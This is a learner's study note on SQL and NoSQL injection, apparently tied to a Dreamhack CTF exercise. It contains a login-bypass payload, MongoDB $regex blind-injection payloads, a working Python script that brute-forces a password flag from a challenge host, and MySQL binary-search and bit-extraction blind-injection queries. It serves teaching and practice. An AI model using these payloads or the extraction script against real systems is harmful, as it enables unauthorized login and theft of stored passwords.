## RDBMS : Relational Database Management System

> RDBMS has limit of capacity because it use second-dementional table.

## NRDBMS : Non - RDBMS (NoSQL)

#### NoSQL also generate query dynamically -> sqli can cause.

#### NoSQL use key-value storing method while RDBMS use TABLE. -> Optimized store capacity.

<br/>

# SQL injection : in raw query which created dynamically

## If you want to create RawQuery dynamically, use Prepared Statement and Object Relational Mapping

> Prepared Statement : during taking dynamic query, it analyze query itself and then regenerate safe query.

### example of raw query code )

```py
res = query_db(f'select * from users where userid="{userid}" and userpassword = "{userpassword}"')
```

In this code, the query generated including user's input so that sqli can evoke.

### example of exploit of this code )

```sql
admin" --
```

in form of userid we can use this exploit to login for admin

## NoSQL injection : same with normal sqli except the point that NoSQL has different syntax.

```js
app.get('/query', function(req,res) {
    db.collection('user').findOne({
        'uid': req.body.uid,
        'upw': req.body.upw
    }, function(err, result){
        if (err) throw err;
        console.log(result);
        if(result){
            res.send(result['uid']);
        }else{
            res.send('undefined');
        }
    })
```

in this code, we can use sqli.

```sql
#blind sqli
{"uid": "admin", "upw": {"$regex":".{5}"}}
{"uid": "admin", "upw": {"$regex":"^a"}}
{"uid": "admin", "upw": {"$regex":"^aa"}}
{"uid": "admin", "upw": {"$regex":"^ab"}}
...
{"uid": "admin", "upw": {"$regex":"^apple$"}}
```

this is the repeat of substitution.

> $regex : select document which corresponds with regular expression
<br/>

## SQL Features

#### `UNION` : Link multiple `select`

> Cautions : <li> Result of each linked `select` should have same number of columns. </li>
>
> <li> The data type of each linked `select` should same with each other.(applied only some dbms like mssql) </li>

#### `Subquery` : usage of inner query in a query.

> We can access other table the query not take, by use it. Also, we can use `select` where it is not used.  
> Cautions :
>
> <li> Result of subquery should return __single row__ and __single column__ in the `columns` clause </li>  
> <li> Result of subquery can return __multiple row__ and __multiple columns__ in the `FROM` cluase</li>  
> <li> Result of subquery can return __multiple row__ in the `WHERE` clause</li>

#### `Applicaiton Logic`

> by analyzing logic of web application, we can attack with `union`, `if()` and etc.... <- whether logic has output or not is very important to us.
<br/>

# Below exercise is set to MongoDB.

### It has filter like below.

#### filter )

```js
filter = function(data){
    const dump = JSON.stringify(data).toLowerCase();
    var flag = false;
    BAN.forEach(function(word){
        if(dump.indexOf(word)!=-1) flag = true;
    });
    return flag;
}
#It returns True if banned keyword is included in your input.
```

### But keyword filtering system is not secure. We can use sqli untill the fundamental vulerabililty exists.

> filtering is easily paralyzed by using regular expression "." that mean every character. ex) admin -> ad.in , DH{ -> D.{

### Here is the exploit code use blind sqli )

```py
import requests, string

HOST = 'http://host3.dreamhack.games:13265'
SUCCESS = 'admin'
ALPHANUMERIC = string.digits + string.ascii_letters

i = 1
while True:
    res = requests.get(f'{HOST}/login?uid[$regex]=adm&upw[$regex]=.{{{i}}}')
    if res.text == SUCCESS:
        i += 1
    else:
        i -= 1
        break;
print(f'length of password : {i}')

flag = ''
for k in range(i-4):
    for ch in ALPHANUMERIC:
        res = requests.get(f'{HOST}/login?uid[$regex]=adm&upw[$regex]=D.{{{flag}{ch}')
        if res.text == SUCCESS:
            flag += ch
            break

print(f'flag : DH{{{flag}}}')
```

first, code find the length of the password and then, using for loop with range(LENGTH OF PWD), find flag by repeating substition.
<br/>

## ExploitTech : blind sqli advanced

#### Binary Search : **_Binary Search based on a assumtion that data is sorted._** Set range(n,m). As example, let range as (0,100). This method compare target data with middle-orderd data, and regenerate data range (0,50) if target <= middle else range(51, 100). repeat it so that target be captured

> example
>
> ```sql
> mysql> select * from users where username='admin' and ascii(substr(password, 1, 1))>79;
> /* This exploit compare first word of password with ascii_middle_value:79 */
> ```

#### Bit Calculation : ascii letter can express range from 0 to 127 so that we can express it also with 7 bit. By using repeat of exploit statement including useful function like `bin` and `substr`, we can find password

> example
>
> ```sql
> mysql> select * from users where username='admin' and substr(bin(ord(password)),1,1)=1;
> mysql> select * from users where username='admin' and substr(bin(ord(password)),2,1)=1;
> ...
> mysql> select * from users where username='admin' and substr(bin(ord(password)),7,1)=1;
> ```
